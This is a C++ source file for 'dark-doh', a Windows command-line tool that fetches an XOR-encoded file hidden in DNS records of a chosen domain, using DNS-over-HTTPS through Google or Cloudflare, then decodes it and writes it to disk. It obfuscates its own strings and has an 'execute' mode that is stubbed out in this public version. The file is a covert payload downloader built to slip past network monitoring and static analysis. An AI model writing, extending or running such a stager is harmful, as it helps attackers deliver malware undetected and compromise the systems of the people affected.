#define _WIN32_WINNT 0x0A00

// RapidJSON
#include "headers/rapidjson/document.h"
#include "headers/rapidjson/writer.h"
#include "headers/rapidjson/stringbuffer.h"

// common
#include <windows.h>
#include <iostream>
#include <set>

// wininit thing
#include <wininet.h>

// dark-doh headers
#include "include/dark-doh.h"
#include "include/dark-doh-priv.h"
#include "include/dark-doh-debug.h"

// string obfuscation
#include "headers/obfuscate.h"

#pragma comment (lib, "Wininet.lib")

using namespace std;

void printHelp()
{
	printf(AY_OBFUSCATE("\n dark-doh.exe command line program v1.0\n"));
	printf(AY_OBFUSCATE("\n Command line arguments: 'subdomain' 'command' 'DoH provider' 'domain name'"));
	printf(AY_OBFUSCATE("\n 1) Subdomain: subdomain that stores data, ex: file1"));
	printf(AY_OBFUSCATE("\n 2) Task: download or execute, ex: download => public version supports only download"));
	printf(AY_OBFUSCATE("\n 3) DoH provider: google, cloudflare, or mix, ex: google => public version supports only google"));
	printf(AY_OBFUSCATE("\n 4) Domain name used for serving files, ex: yourdomain.com"));
	printf(AY_OBFUSCATE("\n Ex: dark-doh.exe file1 download google yourdomain.com\n"));
	printf(AY_OBFUSCATE("\n Disclaimer: The authors do not have any responsibility and/or liability for how you will use the dark-doh.exe!\n"));
	printf(AY_OBFUSCATE("\n Not enough or incorrect arguments, exiting..."));
	exit(7);
}

int main(int argc, char** argv) {
	if (argc != 5) { printHelp(); }
	if (!std::set<std::string>{"download", "execute"}.count(std::string(argv[2]))) { printHelp(); }
	if (!std::set<std::string>{"google", "cloudflare", "mix"}.count(std::string(argv[3]))) { printHelp(); }

	std::cout << AY_OBFUSCATE("The subdomain name: ") << argv[1] << std::endl;
	std::cout << AY_OBFUSCATE("The command: ") << argv[2] << std::endl;
	std::cout << AY_OBFUSCATE("The DoH provider: ") << argv[3] << std::endl;
	std::cout << AY_OBFUSCATE("The serving domain name: ") << argv[4] << std::endl;
	std::cout << AY_OBFUSCATE("Filename used for logging: ") << filelog_name << std::endl;

	DdClass init;
	DdpClass act;

// Get a XOR key
	DWORD xkey = init.getKeyViaDOH(argv[1], argv[3], argv[4]);
	//useless check: if no DNS record the program will exit, if empty record then there is DNS zone population issue
	if (xkey == 0) { cout << AY_OBFUSCATE("Can't grab the key, exiting...") << std::endl; exit(1); }

// Get number of chunks
	int parts = init.getChunksViaDOH(argv[1], argv[3], argv[4]);
	if (parts == 0) { cout << AY_OBFUSCATE("Can't grab the chunks amount, exiting...") << std::endl; exit(6); }

// Get DATA via DoH
	std::string dFile = init.getFileViaDOH(argv[1], argv[3], argv[4], parts);

// Print amount of errors occured
	printf(AY_OBFUSCATE("ERROR count = %d\n"), init.errors);

// Convert and decode DATA
	LPCSTR encData = (LPCSTR)VirtualAlloc(NULL, strlen(dFile.c_str()), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	int decSize = init.anDecode(dFile, encData);
	LPCSTR xorData = (LPCSTR)VirtualAlloc(NULL, decSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	init.xorDecode(xkey, encData, (char*)xorData, decSize);

	switch (hashit(argv[2]))
	{
	case hashit("download"):
		init.saveData(xorData, decSize, argv[1]);
		break;
	case hashit("execute"):
		act.publicLock();
		break;
	}

	return SUCCESS;
}
